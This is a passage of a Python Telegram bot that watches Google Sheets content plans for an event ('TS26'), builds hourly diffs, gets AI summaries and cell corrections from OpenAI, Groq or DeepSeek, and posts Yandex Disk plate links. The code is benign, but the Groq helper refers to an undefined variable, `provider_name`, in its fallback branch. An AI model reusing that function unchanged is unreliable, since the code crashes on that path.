    names = []
    for old_index, new_index in pairs:
        day_name = day_context(current_rows, new_index) or day_context(previous_rows, old_index)
        if not any(item in day_name for item in marker):
            continue
        row_name = row_identity(current_rows, headers, new_index, key_col)
        for col_index, header in enumerate(headers):
            old_value = cell(previous_rows, old_index, col_index)
            new_value = cell(current_rows, new_index, col_index)
            if old_value == new_value:
                continue
            messages.append(describe_grid_change(sheet_label, day_name, row_name, header, old_value, new_value))
            for candidate in (old_value, new_value):
                if candidate and candidate != "пусто" and len(candidate.split()) in (2, 3) and len(candidate) <= 100:
                    names.append(candidate)
    unique_names = []
    seen = set()
    for name in names:
        key = normalize_person_key(name)
        if key not in seen:
            seen.add(key)
            unique_names.append(name)
    return messages, unique_names


def notify_current_day_plate_changes(args, sheet, previous, current, state):
    messages, names = current_day_change_details(sheet["label"], previous, current)
    if not messages:
        return False
    links, link_errors = yandex_plate_links(names, timeout=args.timeout)
    lines = ["Изменились плашки сегодняшнего дня.", ""] + messages
    if links:
        lines.extend(["", "Готовые плашки на Яндекс.Диске:"])
        lines.extend(["{}: {}".format(name, links[name]) for name in links])
    missing = [name for name in names if name not in links]
    if missing:
        lines.extend(["", "Еще не готовы: {}.".format(", ".join(missing))])
    if link_errors:
        lines.append("Ссылки Яндекс.Диска временно недоступны.")
        log("Не удалось получить ссылки готовых плашек: {}".format("; ".join(link_errors)))
    pending = state.setdefault(PENDING_PLATE_LINKS_STATE_KEY, {})
    pending["date"] = moscow_now().strftime("%d.%m")
    pending["names"] = missing
    notify(args, "TS26: плашки на сегодня", "\n".join(lines), subtitle=sheet["label"], sheet=sheet, state=state)
    return True


def maybe_send_pending_plate_links(args, sheet, state):
    pending = state.get(PENDING_PLATE_LINKS_STATE_KEY) or {}
    names = [normalize_space(item) for item in pending.get("names") or [] if normalize_space(item)]
    if not names or pending.get("date") != moscow_now().strftime("%d.%m"):
        if names and pending.get("date") != moscow_now().strftime("%d.%m"):
            state.pop(PENDING_PLATE_LINKS_STATE_KEY, None)
        return False
    links, errors = yandex_plate_links(names, timeout=args.timeout)
    if errors or not links:
        return False
    remaining = [name for name in names if name not in links]
    pending["names"] = remaining
    lines = ["Готовые плашки на Яндекс.Диске:"]
    lines.extend(["{}: {}".format(name, links[name]) for name in links])
    notify(args, "TS26: плашки готовы", "\n".join(lines), subtitle=sheet["label"], sheet=sheet, state=state)
    if not remaining:
        state.pop(PENDING_PLATE_LINKS_STATE_KEY, None)
    return True


def content_plan_digest_state(state):
    digest = state.setdefault(CONTENT_PLAN_DIGEST_STATE_KEY, {})
    if not isinstance(digest, dict):
        digest = {}
        state[CONTENT_PLAN_DIGEST_STATE_KEY] = digest
    events = digest.get("events")
    if not isinstance(events, list):
        digest["events"] = []
    return digest


def content_plan_hour_key(moment=None):
    moment = moment or moscow_now()
    return moment.strftime("%Y-%m-%dT%H")


def queue_content_plan_change(state, message, captured_at=None):
    digest = content_plan_digest_state(state)
    lines = [line for line in str(message or "").splitlines() if line.strip()]
    digest["events"].append({
        "captured_at": captured_at or now_text(),
        "diff": str(message or ""),
        "change_count": len(lines),
    })
    return len(digest["events"])


def openai_response_text(payload, timeout):
    key = os.environ.get("OPENAI_API_KEY", "").strip()
    if not key:
        raise ConfigError("Не задан OPENAI_API_KEY: отправляю diff без AI-сводки.")
    request = urllib.request.Request(
        OPENAI_RESPONSES_URL,
        data=json.dumps(payload, ensure_ascii=False).encode("utf-8"),
        headers={
            "Authorization": "Bearer {}".format(key),
            "Content-Type": "application/json",
            "User-Agent": USER_AGENT,
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            raw = response.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", errors="replace")
        raise MonitorError("OpenAI HTTP {}: {}".format(exc.code, body[:500]))
    except urllib.error.URLError as exc:
        raise MonitorError("OpenAI недоступен: {}".format(exc.reason))
    try:
        parsed = json.loads(raw)
    except ValueError:
        raise MonitorError("OpenAI вернул не JSON: {}".format(raw[:500]))
    if parsed.get("error"):
        error = parsed["error"]
        detail = error.get("message") if isinstance(error, dict) else str(error)
        raise MonitorError("OpenAI ошибка: {}".format(detail))
    output_text = parsed.get("output_text")
    if isinstance(output_text, str) and output_text.strip():
        return output_text.strip()
    for output in parsed.get("output") or []:
        for content in output.get("content") or []:
            if content.get("type") == "output_text" and content.get("text"):
                return str(content["text"]).strip()
    raise MonitorError("OpenAI не вернул текст сводки.")


def groq_chat_completion_text(payload, timeout):
    key = os.environ.get("GROQ_API_KEY", "").strip()
    if not key:
        raise ConfigError("Не задан GROQ_API_KEY: отправляю diff без AI-сводки.")
    request = urllib.request.Request(
        GROQ_CHAT_COMPLETIONS_URL,
        data=json.dumps(payload, ensure_ascii=False).encode("utf-8"),
        headers={
            "Authorization": "Bearer {}".format(key),
            "Content-Type": "application/json",
            "User-Agent": USER_AGENT,
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            raw = response.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", errors="replace")
        raise MonitorError("Groq HTTP {}: {}".format(exc.code, body[:500]))
    except urllib.error.URLError as exc:
        raise MonitorError("Groq недоступен: {}".format(exc.reason))
    except TimeoutError:
        raise MonitorError("Groq не ответил за {} секунд.".format(timeout))
    try:
        parsed = json.loads(raw)
    except ValueError:
        raise MonitorError("Groq вернул не JSON: {}".format(raw[:500]))
    if parsed.get("error"):
        error = parsed["error"]
        detail = error.get("message") if isinstance(error, dict) else str(error)
        raise MonitorError("Groq ошибка: {}".format(detail))
    choices = parsed.get("choices") or []
    if choices:
        choice = choices[0] or {}
        message = choice.get("message") or {}
        text = extract_chat_message_text(message.get("content"))
        if not text:
            text = extract_chat_message_text(choice.get("text"))
        if not text:
            # DeepSeek may put a JSON answer in an alternate field on an occasional empty-content response.
            for key in ("output_text", "answer"):
                text = extract_chat_message_text(message.get(key))
                if text:
                    break
        if not text and provider_name.casefold() == "deepseek":
            reasoning = extract_chat_message_text(message.get("reasoning_content"))
            if reasoning:
                candidate = extract_json_object_text(reasoning)
                if candidate.lstrip().startswith("{"):
                    text = candidate
        if text:
            return text
    raise MonitorError("Groq не вернул текст сводки.")


def chat_completion_text(provider_name, url, api_key, payload, timeout):
    if not api_key:
        raise ConfigError("Не задан ключ {}.".format(provider_name))
    request = urllib.request.Request(
        url,
        data=json.dumps(payload, ensure_ascii=False).encode("utf-8"),
        headers={
            "Authorization": "Bearer {}".format(api_key),
            "Content-Type": "application/json",
            "User-Agent": USER_AGENT,
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            raw = response.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", errors="replace")
        raise MonitorError("{} HTTP {}: {}".format(provider_name, exc.code, body[:500]))
    except urllib.error.URLError as exc:
        raise MonitorError("{} недоступен: {}".format(provider_name, exc.reason))
    except TimeoutError:
        raise MonitorError("{} не ответил за {} секунд.".format(provider_name, timeout))
    try:
        parsed = json.loads(raw)
    except ValueError:
        raise MonitorError("{} вернул не JSON: {}".format(provider_name, raw[:500]))
    if parsed.get("error"):
        error = parsed["error"]
        detail = error.get("message") if isinstance(error, dict) else str(error)
        raise MonitorError("{} ошибка: {}".format(provider_name, detail))
    choices = parsed.get("choices") or []
    if choices:
        message = choices[0].get("message") or {}
        text = extract_chat_message_text(message.get("content"))
        if text:
            return text
    raise MonitorError("{} не вернул текст.".format(provider_name))


def ai_summary_instructions():
    return (
        "Ты готовишь короткую сводку изменений Контент-плана для Telegram. "
        "Верни только 3-5 коротких строк на русском. Каждая строка должна описывать "
        "заметный факт из diff. Не добавляй факты, имена, даты или ссылки, которых нет "
        "в diff. Не используй Markdown, HTML, заголовки и вступления."
    )


def ai_summary_response_text(source_diff, timeout):
    provider = normalize_space(os.environ.get("AI_SUMMARY_PROVIDER", "")).casefold()
    has_groq = bool(os.environ.get("GROQ_API_KEY", "").strip())
    has_openai = bool(os.environ.get("OPENAI_API_KEY", "").strip())
    if not provider:
        provider = "groq" if has_groq else "openai"
    instructions = ai_summary_instructions()
    if provider == "groq":
        model = os.environ.get("GROQ_SUMMARY_MODEL", "llama-3.3-70b-versatile").strip() or "llama-3.3-70b-versatile"
        payload = {
            "model": model,
            "messages": [
                {"role": "system", "content": instructions},
                {"role": "user", "content": source_diff},
            ],
            "temperature": 0.2,
            "max_tokens": 350,
        }
        return groq_chat_completion_text(payload, timeout)
    if provider == "openai":
        model = os.environ.get("OPENAI_SUMMARY_MODEL", "gpt-5-mini").strip() or "gpt-5-mini"
        payload = {
            "model": model,
            "instructions": instructions,
            "input": source_diff,
            "max_output_tokens": 350,
        }
        return openai_response_text(payload, timeout)
    raise ConfigError("Неизвестный AI_SUMMARY_PROVIDER='{}'. Используйте groq или openai.".format(provider))


def build_ai_content_plan_summary(diff, timeout):
    max_chars = max(1000, env_int("OPENAI_SUMMARY_MAX_INPUT_CHARS", 60000))
    source_diff = str(diff or "")
    if len(source_diff) > max_chars:
        source_diff = source_diff[:max_chars].rstrip() + "\n[Остальная часть diff будет показана ниже без изменений.]"
        log("Diff для AI-сводки сокращен до {} символов.".format(max_chars))
    response = ai_summary_response_text(source_diff, timeout)
    lines = []
    for raw_line in response.splitlines():
        line = normalize_space(raw_line).lstrip("-• ").strip()
        line = re.sub(r"https?://\S+", "", line).strip()
        if line:
            lines.append(line)
        if len(lines) == 5:
            break
    if not lines:
        raise MonitorError("AI-провайдер вернул пустую сводку.")
    return "\n".join(lines)


def strip_json_code_fence(text):
    value = str(text or "").strip()
    if value.startswith("```"):
        value = re.sub(r"^```(?:json)?\s*", "", value, flags=re.IGNORECASE)
        value = re.sub(r"\s*```$", "", value)
    return value.strip()


def extract_chat_message_text(content):
    if isinstance(content, str) and content.strip():
        return content.strip()
    if isinstance(content, list):
        parts = []
        for item in content:
            if isinstance(item, str) and item.strip():
                parts.append(item.strip())
                continue
            if not isinstance(item, dict):
                continue
            text = item.get("text")
            if isinstance(text, str) and text.strip():
                parts.append(text.strip())
                continue
            if isinstance(text, list):
                for text_part in text:
                    if isinstance(text_part, str) and text_part.strip():
                        parts.append(text_part.strip())
                    elif isinstance(text_part, dict):
                        value = text_part.get("value") or text_part.get("text")
                        if isinstance(value, str) and value.strip():
                            parts.append(value.strip())
            value = item.get("value")
            if isinstance(value, str) and value.strip():
                parts.append(value.strip())
        if parts:
            return "\n".join(parts).strip()
    if isinstance(content, dict):
        for key in ("text", "value"):
            value = content.get(key)
            if isinstance(value, str) and value.strip():
                return value.strip()
    return ""


def extract_json_object_text(text):
    value = strip_json_code_fence(text)
    if not value:
        return ""
    start = value.find("{")
    if start < 0:
        return value
    depth = 0
    in_string = False
    escape = False
    for index in range(start, len(value)):
        char = value[index]
        if in_string:
            if escape:
                escape = False
            elif char == "\\":
                escape = True
            elif char == '"':
                in_string = False
            continue
        if char == '"':
            in_string = True
        elif char == "{":
            depth += 1
        elif char == "}":
            depth -= 1
            if depth == 0:
                return value[start : index + 1]
    return value[start:]


def ae_correction_instructions():
    return (
        "Ты корректируешь одну ячейку контент-плана для After Effects. "
        "Верни только JSON-объект без Markdown. Не добавляй фактов, которых нет в raw_text. "
        "Исправляй только уверенные случаи: тему, короткое описание, формат, людей и должности. "
        "Тема и описание должны быть короткими. Описание не должно дублировать тему. "
        "Если описание сводится к повтору темы, верни пустую строку. "
        "Если в raw_text есть маркер 'главная встреча дня', описание должно быть 'Главная встреча дня'. "
        "Нумерацию вида '1)'/'2)' не включай ни в тему, ни в должности, ни в имена. "
        "В русском ФИО из двух слов первое слово всегда сохраняй как фамилию, второе как имя. "
        "Не удаляй незнакомую фамилию с окончанием -ич/-евич/-ович: такое слово может быть фамилией, например 'Кастюкевич Игорь'. "
        "Отчество учитывай только как третье слово после уже распознанных фамилии и имени. Никогда не возвращай вместо полного ФИО только имя. "
        "Если передан position_reference, это согласованный справочник: при точном совпадении верни должность ровно из справочника, без перефразирования. "
        "Если сомневаешься, оставь поле пустым и добавь предупреждение. "
        "Схема: {\"topic\":\"\",\"description\":\"\",\"format\":\"\",\"people\":[{\"name\":\"\",\"role\":\"\",\"position\":\"\"}],\"warnings\":[],\"confidence\":0.0}. "
        "Ответ должен быть компактным, одной JSON-структурой, без пояснений до и после."
    )


def ae_correction_payload(context):
    return {
        "source_cell": context.get("source_cell", ""),
        "day": context.get("day", ""),
        "date": context.get("date", ""),
        "time": context.get("time", ""),
        "venue": context.get("venue", ""),
        "raw_text": context.get("raw_text", ""),
        "regular_parser": context.get("parser", {}),
        "position_reference": context.get("position_reference", []),
    }


def ae_correction_provider_request(provider, context, timeout):
    provider = normalize_space(provider).casefold()
    prompt = json.dumps(ae_correction_payload(context), ensure_ascii=False)
    max_tokens = max(400, env_int("AI_CORRECTION_MAX_OUTPUT_TOKENS", 800))
    attempts = [
        {
            "messages": [
                {"role": "system", "content": ae_correction_instructions()},
                {"role": "user", "content": prompt},
            ],
            "temperature": 0.1,
            "max_tokens": max_tokens,
        },
        {
            "messages": [
                {"role": "system", "content": ae_correction_instructions()},
                {"role": "user", "content": prompt},
                {"role": "assistant", "content": "{"},
            ],
            "temperature": 0,
            "max_tokens": max_tokens,
        },
    ]
    last_error = None
    for attempt_index, attempt in enumerate(attempts, start=1):
        if provider == "deepseek":
            model = os.environ.get("DEEPSEEK_MODEL", "deepseek-v4-pro").strip() or "deepseek-v4-pro"
            payload = {
                "model": model,
                "messages": attempt["messages"],
                "temperature": attempt["temperature"],
                "max_tokens": attempt["max_tokens"],
                "response_format": {"type": "json_object"},
            }
            payload["thinking"] = {"type": "disabled"}
            text = chat_completion_text("DeepSeek", DEEPSEEK_CHAT_COMPLETIONS_URL, os.environ.get("DEEPSEEK_API_KEY", "").strip(), payload, timeout)
        elif provider == "groq":
            model = os.environ.get("GROQ_CORRECTION_MODEL", os.environ.get("GROQ_SUMMARY_MODEL", "llama-3.3-70b-versatile")).strip() or "llama-3.3-70b-versatile"
            payload = {
                "model": model,
                "messages": attempt["messages"],
                "temperature": attempt["temperature"],
                "max_tokens": attempt["max_tokens"],
                "response_format": {"type": "json_object"},
            }
            text = chat_completion_text("Groq", GROQ_CHAT_COMPLETIONS_URL, os.environ.get("GROQ_API_KEY", "").strip(), payload, timeout)
        else:
            raise ConfigError("Неизвестный AI_CORRECTION_PROVIDER='{}'.".format(provider))
        try:
            parsed = json.loads(extract_json_object_text(text))
        except ValueError as exc:
            last_error = exc
            if attempt_index < len(attempts):
                continue
            raise MonitorError("{} вернул невалидный JSON коррекции: {}".format(provider, exc))
        if not isinstance(parsed, dict):
            last_error = MonitorError("{} вернул JSON не объект.".format(provider))
            if attempt_index < len(attempts):
                continue
            raise last_error
        return parsed
    raise MonitorError("{} не смог вернуть корректный JSON: {}".format(provider, last_error))


def build_ae_llm_corrector(args):
    provider = normalize_space(os.environ.get("AI_CORRECTION_PROVIDER", "deepseek")).casefold() or "deepseek"
    fallback = normalize_space(os.environ.get("AI_CORRECTION_FALLBACK_PROVIDER", "groq")).casefold()
    max_calls = max(0, env_int("AI_CORRECTION_MAX_CALLS_PER_SYNC", 16))
    enabled = env_bool("AI_CORRECTION_ENABLED", True) and max_calls > 0
    has_primary = (provider == "deepseek" and os.environ.get("DEEPSEEK_API_KEY", "").strip()) or (provider == "groq" and os.environ.get("GROQ_API_KEY", "").strip())
    has_fallback = (fallback == "deepseek" and os.environ.get("DEEPSEEK_API_KEY", "").strip()) or (fallback == "groq" and os.environ.get("GROQ_API_KEY", "").strip())
    if not enabled or not (has_primary or has_fallback):
        return None
    usage = {"count": 0}
    blocked_providers = set()

    def correct(context):
        if usage["count"] >= max_calls:
            return {"warnings": ["Лимит LLM-коррекций за sync исчерпан."], "confidence": 0}
        usage["count"] += 1
        providers = [provider]
        if fallback and fallback != provider:
            providers.append(fallback)
        last_error = None
        for item in providers:
            if item in blocked_providers:
                continue
            try:
                return ae_correction_provider_request(item, context, args.timeout)
            except (MonitorError, ConfigError) as exc:
                last_error = exc
                log("AE LLM-коррекция через {} не получена: {}".format(item, exc))
                if " HTTP 429:" in str(exc) or "rate_limit_exceeded" in str(exc):
                    blocked_providers.add(item)
        return {"warnings": ["LLM-коррекция недоступна: {}".format(last_error)], "confidence": 0}

    return correct


def flush_content_plan_digest(args, sheets, state, moment=None):
    """Send one Content Plan package after an hour boundary, retaining failures."""
    digest = content_plan_digest_state(state)
    current_hour = content_plan_hour_key(moment)
    events = digest.get("events") or []
    last_flush_hour = digest.get("last_flush_hour")

    # Keep a failed package queued, but do not hammer Telegram/AI every monitor
    # tick. The admin can see the last error in /status.
    last_attempt_at = digest.get("last_attempt_at")
    if events and last_attempt_at:
        try:
            attempt_time = _dt.datetime.fromisoformat(str(last_attempt_at))
            if (_dt.datetime.now() - attempt_time).total_seconds() < max(30, CONTENT_PLAN_DELIVERY_RETRY_SECONDS):
                return False
        except ValueError:
            pass

    if not events:
        if last_flush_hour != current_hour:
            digest["last_flush_hour"] = current_hour
            return True
        return False
    if last_flush_hour == current_hour:
        return False

    content_sheet = next((sheet for sheet in sheets if is_content_plan_sheet(sheet)), None)
    if not content_sheet:
        return False
    diffs = [str(event.get("diff") or "") for event in events if str(event.get("diff") or "").strip()]
    if not diffs:
        digest["events"] = []
        digest["last_flush_hour"] = current_hour
        return True
    full_diff = "\n".join(diffs)
    event_count = len(events)
    change_count = sum(int(event.get("change_count") or 0) for event in events)
    ai_summary = ""
    summary_error = ""
    try:
        ai_summary = build_ai_content_plan_summary(full_diff, args.timeout)
        log("AI-сводка Контент-плана готова: событий {}, строк diff {}.".format(event_count, change_count))
    except (MonitorError, ConfigError) as exc:
        summary_error = str(exc)
        log("AI-сводка Контент-плана не получена: {}".format(exc))

    chat_ids = recipient_chat_ids(content_sheet, state=state)
    digest["last_attempt_at"] = now_text()
    digest["last_attempt_hour"] = current_hour
    digest["last_error"] = ""
    chunks = 0
    summary_body = "{}\nКоротко за час\n{}\n{}".format(TELEGRAM_QUOTE_START, ai_summary, TELEGRAM_QUOTE_END) if ai_summary else "AI-сводка недоступна.\nПолный diff отправляется отдельным сообщением."
    try:
        send_macos_notification(args, "TS26: обновления за час", ai_summary or summary_error or "Полный diff отправляется отдельным сообщением.", subtitle=content_sheet["label"])
        chunks += send_telegram_chunks_to_chat_ids(
            args,
            chat_ids,
            "TS26: AI-сводка за час" if ai_summary else "TS26: AI-сводка недоступна",
            summary_body,
            subtitle=content_sheet["label"],
        )
    except (MonitorError, ConfigError) as exc:
        log("Не удалось отправить AI-сводку Контент-плана, diff все равно будет отправлен: {}".format(exc))

    diff_message = "Полный diff\n{}".format(full_diff)
    try:
        chunks += send_telegram_chunks_to_chat_ids(
            args,
            chat_ids,
            "TS26: полный diff за час",
            diff_message,
            subtitle=content_sheet["label"],
            url=content_sheet["url"],
        )
    except (MonitorError, ConfigError) as exc:
        log("Не удалось отправить почасовой пакет Контент-плана: {}".format(exc))
        digest["last_error"] = str(exc)
        return False

    digest["events"] = []
    digest["last_flush_hour"] = current_hour
    digest["last_sent_at"] = now_text()
    digest["last_error"] = ""
    log("Почасовой пакет Контент-плана отправлен: событий {}, строк diff {}, сообщений {}.".format(event_count, change_count, chunks))
    return True


def h(value):
    return html.escape(str(value or ""), quote=False)


def changed_span(value, other_value):
    text = normalize_space(value)
    other = normalize_space(other_value)
    if not text:
        return (0, len(text))
    prefix_len = 0
    max_prefix = min(len(text), len(other))
    while prefix_len < max_prefix and text[prefix_len] == other[prefix_len]:
        prefix_len += 1

    suffix_len = 0
    max_suffix = min(len(text) - prefix_len, len(other) - prefix_len)
    while suffix_len < max_suffix and text[len(text) - 1 - suffix_len] == other[len(other) - 1 - suffix_len]:
        suffix_len += 1

    start = prefix_len
    end = len(text) - suffix_len
    while start < end and text[start] in DIFF_BOUNDARY_CHARS:
        start += 1
    while end > start and text[end - 1] in DIFF_BOUNDARY_CHARS:
        end -= 1
    if start >= end:
        return (0, len(text))
    while start > 0 and text[start - 1] not in DIFF_BOUNDARY_CHARS:
        start -= 1
    while end < len(text) and text[end] not in DIFF_BOUNDARY_CHARS:
        end += 1
    return (start, end)


def underline_changed_value(value, other_value):
    text = display_value(value)
    if text == "пусто":
        return "<u>{}</u>".format(h(text))
    start, end = changed_span(text, display_value(other_value))
    return "{}<u>{}</u>{}".format(h(text[:start]), h(text[start:end]), h(text[end:]))


def render_telegram_message(title, message, subtitle="", url=""):
    lines = ["<b>{}</b>".format(h(title))]
    if subtitle:
        lines.append("<i>{}</i>".format(h(subtitle)))
    body = render_telegram_body(message)
    if body:
        lines.extend(["", body])
    if url:
        lines.extend(["", '<a href="{}">Открыть таблицу</a>'.format(html.escape(str(url), quote=True))])
    return "\n".join(lines)


def render_telegram_body(message):
    rendered = []
    quote_lines = []
    in_quote = False
    for raw_line in str(message or "").splitlines():
        line = normalize_space(raw_line)
        if not line:
            if not in_quote and rendered and rendered[-1] != "":
                rendered.append("")
            continue
        if line == TELEGRAM_QUOTE_START:
            in_quote = True
            quote_lines = []
            continue
        if line == TELEGRAM_QUOTE_END:
            if quote_lines:
                rendered.append(render_telegram_quote(quote_lines))
            in_quote = False
            quote_lines = []
            continue
        if in_quote:
            quote_lines.append(line)
            continue
        rendered.append(render_telegram_change_line(line))
    if quote_lines:
        rendered.append(render_telegram_quote(quote_lines))
    while rendered and rendered[-1] == "":
        rendered.pop()
    return "\n".join(rendered)


def render_telegram_quote(lines):
    rendered = []
    for index, line in enumerate(lines):
        if index == 0:
            rendered.append("<b>{}</b>".format(h(line)))
        else:
            rendered.append(h(line))
    return "<blockquote>{}</blockquote>".format("\n".join(rendered))


def render_telegram_change_line(line):
    if line in {"Полный diff", "Коротко за час"}:
        return "<b>{}</b>".format(h(line))

    grid_day_match = re.match(r"^(.+?): день «(.+?)», строка «(.+?)», колонка «(.+?)» - было «(.*?)», стало «(.*?)»\.$", line)
    if grid_day_match:
        _sheet, day_name, row_name, column_name, old_value, new_value = grid_day_match.groups()
        return "• <b>День:</b> {}\n  <b>Строка:</b> {}\n  <b>Колонка:</b> {}\n  <b>Было:</b> {}\n  <b>Стало:</b> {}".format(
            h(day_name),
            h(row_name),
            h(column_name),
            underline_changed_value(old_value, new_value),
            underline_changed_value(new_value, old_value),
        )

    grid_match = re.match(r"^(.+?): строка «(.+?)», колонка «(.+?)» - было «(.*?)», стало «(.*?)»\.$", line)
    if grid_match:
        _sheet, row_name, column_name, old_value, new_value = grid_match.groups()
        return "• <b>Строка:</b> {}\n  <b>Колонка:</b> {}\n  <b>Было:</b> {}\n  <b>Стало:</b> {}".format(
            h(row_name),
            h(column_name),
            underline_changed_value(old_value, new_value),
            underline_changed_value(new_value, old_value),
        )

    field_match = re.match(r"^Изменено поле «(.+?)» у (.+?): было «(.*?)», стало «(.*?)»\.$", line)
    if field_match:
        field_name, row_name, old_value, new_value = field_match.groups()
        return "• <b>{}</b> у {}\n  <b>Было:</b> {}\n  <b>Стало:</b> {}".format(
            h(field_name),
            h(row_name),
            underline_changed_value(old_value, new_value),
            underline_changed_value(new_value, old_value),
        )

    position_match = re.match(r"^Изменена должность у (.+?): было «(.*?)», стало «(.*?)»\.$", line)
    if position_match:
        row_name, old_value, new_value = position_match.groups()
        return "• <b>Должность</b> у {}\n  <b>Было:</b> {}\n  <b>Стало:</b> {}".format(
            h(row_name),
            underline_changed_value(old_value, new_value),
            underline_changed_value(new_value, old_value),
        )

    added_match = re.match(r"^(.+?): добавлена строка «(.+?)»\.$", line)
    if added_match:
        _sheet, row_name = added_match.groups()
        return "• <b>Добавлена строка:</b> {}".format(h(row_name))

    deleted_match = re.match(r"^(.+?): удалена строка «(.+?)»\.$", line)
    if deleted_match:
        _sheet, row_name = deleted_match.groups()
        return "• <b>Удалена строка:</b> {}".format(h(row_name))

    return h(line)


def admin_keyboard(section="home"):
    if section == "monitoring":
        rows = [
            [
                {"text": "Статус", "callback_data": "dbg:status"},
                {"text": "Получатели", "callback_data": "dbg:recipients"},
            ],
            [
                {"text": "Тест Контент-план", "callback_data": "dbg:test:Контент-план"},
                {"text": "Тест План записи", "callback_data": "dbg:test:План записи"},
            ],
            [
                {"text": "Тест старта", "callback_data": "dbg:test:startup"},
                {"text": "Google-доступ", "callback_data": "dbg:google_access"},
            ],
            [{"text": "Назад", "callback_data": "dbg:home"}],
        ]
    elif section == "access":
        rows = [
            [
                {"text": "Контент-план", "callback_data": "dbg:content_access"},
                {"text": "Плашки", "callback_data": "dbg:plaque_access"},
            ],
            [{"text": "Получатели", "callback_data": "dbg:recipients"}],
            [{"text": "Назад", "callback_data": "dbg:home"}],
        ]
    elif section == "ae":
        rows = [
            [
                {"text": "Запустить sync", "callback_data": "dbg:ae_sync"},
                {"text": "Статус", "callback_data": "dbg:ae_status"},
            ],
            [
                {"text": "Warnings", "callback_data": "dbg:ae_warnings"},
                {"text": "Ссылка", "callback_data": "dbg:ae_link"},
            ],
            [{"text": "Настройка Figma", "callback_data": "dbg:figma"}],
            [{"text": "Назад", "callback_data": "dbg:home"}],
        ]
    elif section == "user_tools":
        rows = [
            [{"text": PLAQUE_ADD_BUTTON_TEXT, "callback_data": "plq:start"}],
            [
                {"text": "Превью формы", "callback_data": "dbg:preview_plaque"},
                {"text": "Режим пользователя", "callback_data": "dbg:user_mode"},
            ],
            [{"text": "Стартовый экран", "callback_data": "dbg:start_screen"}],
            [{"text": "Назад", "callback_data": "dbg:home"}],
        ]
    else:
        rows = [
            [{"text": PLAQUE_ADD_BUTTON_TEXT, "callback_data": "plq:start"}],
            [
                {"text": "Мониторинг", "callback_data": "dbg:menu:monitoring"},
                {"text": "Доступы", "callback_data": "dbg:menu:access"},
            ],
            [
                {"text": "AE-ready", "callback_data": "dbg:menu:ae"},
                {"text": "Пользовательский вид", "callback_data": "dbg:menu:user_tools"},
            ],
            [{"text": "Общий статус", "callback_data": "dbg:status"}],
        ]
    return {"inline_keyboard": rows}


PLAQUE_ADD_BUTTON_TEXT = "Добавить плашку"
HELP_BUTTON_TEXT = "Что умеет бот"


def plaque_keyboard():
    rows = [[{"text": PLAQUE_ADD_BUTTON_TEXT, "callback_data": "plq:start"}]]
    return {"inline_keyboard": rows}


def plaque_user_mode_keyboard():
    return {
        "inline_keyboard": [
            [{"text": PLAQUE_ADD_BUTTON_TEXT, "callback_data": "plq:start"}],
            [{"text": "Вернуться в админку", "callback_data": "plq:admin_panel"}],
        ]
    }


def plaque_reply_keyboard():
    return {
        "keyboard": [[{"text": PLAQUE_ADD_BUTTON_TEXT}], [{"text": HELP_BUTTON_TEXT}]],
        "resize_keyboard": True,
        "is_persistent": True,
    }


def plaque_confirm_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "Отправить", "callback_data": "plq:confirm"}],
            [
                {"text": "Имя", "callback_data": "plq:edit_name"},
                {"text": "Должность", "callback_data": "plq:edit_position"},
                {"text": "Отменить", "callback_data": "plq:cancel"},
            ],
        ]
    }


def plaque_confirm_user_mode_keyboard():
    keyboard = plaque_confirm_keyboard()
    keyboard["inline_keyboard"].append([{"text": "Вернуться в админку", "callback_data": "plq:admin_panel"}])
    return keyboard


def send_admin_message(args, chat_id, title, message, reply_markup=None):
    send_telegram_to_chat_ids(args, [str(chat_id)], title, message, reply_markup=reply_markup)


def send_plain_chat_message(args, chat_id, title, message, reply_markup=None):
    send_telegram_to_chat_ids(args, [str(chat_id)], title, message, reply_markup=reply_markup)


def answer_callback(args, callback_id, text="Готово"):
    if args.no_telegram or not callback_id:
        return
    try:
        telegram_request(get_required_telegram_token(), "answerCallbackQuery", {"callback_query_id": callback_id, "text": text}, args.timeout)
    except (MonitorError, ConfigError) as exc:
        log("Не удалось ответить на callback: {}".format(exc))


def find_sheet_by_label(sheets, label):
    wanted = normalize_header(label)
    for sheet in sheets:
        if normalize_header(sheet["label"]) == wanted:
            return sheet
    return None


def recipients_report(sheets, state=None):
    lines = []
    lines.append("Админы: {}".format(", ".join(admin_chat_ids()) or "не заданы"))
    lines.append("Основные получатели: {}".format(", ".join(default_chat_ids()) or "не заданы"))
    if state is not None:
        lines.append("Контент-план через бота: {}".format(", ".join(content_plan_chat_ids(state)) or "не добавлены"))
        lines.append("Доступ к плашкам: {}".format(", ".join(plaque_chat_ids(state)) or "не добавлены"))
    for sheet in sheets:
        lines.append("{}: {}".format(sheet["label"], ", ".join(recipient_chat_ids(sheet, state=state)) or "не заданы"))
    return "\n".join(lines)


def admin_panel_text(args, sheets, state):
    content_users = len(content_plan_chat_ids(state))
    plaque_users = len(plaque_chat_ids(state))
    ae_data = ae_ready_state(state)
    last_sync = ae_data.get("last_synced_at") or "не было"
    lines = [
        "Панель управления TS26.",
        "",
        "Быстрые действия:",
        "Добавить плашку - пройти форму самому.",
        "Мониторинг - статус таблиц, получатели и тесты.",
        "Доступы - кто получает Контент-план и кто может делать плашки.",
        "AE-ready - синхронизация таблицы для After Effects.",
        "",
        "Коротко сейчас:",
        "Контент-план: {} доп. получателей".format(content_users),
        "Плашки: {} пользователей с доступом".format(plaque_users),
        "AE-ready sync: {}".format(last_sync),
    ]
    return "\n".join(lines)


def admin_section_text(section):
    if section == "monitoring":
        return "Мониторинг.\n\nПроверьте работу бота, получателей и доступ Google."
    if section == "access":
        return (
            "Доступы.\n\n"
            "Контент-план - пользователи получают почасовую сводку и полный diff.\n"
            "Плашки - пользователи могут добавлять и обновлять плашки через форму."
        )
    if section == "ae":
        return (
            "AE-ready.\n\n"
            "Бот читает исходный Контент-план, создает понятную AE-ready таблицу и переносит надежные плашки в МОУШЕН."
        )
    if section == "user_tools":
        return "Пользовательский вид.\n\nЗдесь можно проверить, как бот выглядит для обычного пользователя."
    return ""


def content_access_report(state):
